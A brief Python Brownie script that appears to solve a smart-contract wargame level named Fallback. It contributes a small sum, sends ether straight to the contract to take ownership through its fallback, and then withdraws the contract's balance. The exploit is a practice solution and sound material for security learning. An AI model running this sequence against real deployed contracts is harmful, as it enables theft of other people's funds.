from brownie import interface,network,config
from scripts.helpful import get_account
from web3 import Web3


def exploit():
    account = get_account()
    fallback = interface.Fallback(config["Address"])
    tx = fallback.contribute({"from": account, "value": Web3.toWei(0.0002, "ether")})
    tx.wait(1)
    owner_tx = account.transfer(fallback.address, Web3.toWei(0.0002, "ether"))
    owner_tx.wait(1)
    print("ownership changed")
    print("withdrawing funds...")
    withdraw_tx = fallback.withdraw({"from": account})
    withdraw_tx.wait(1)
    print("done")




def main():
    exploit()
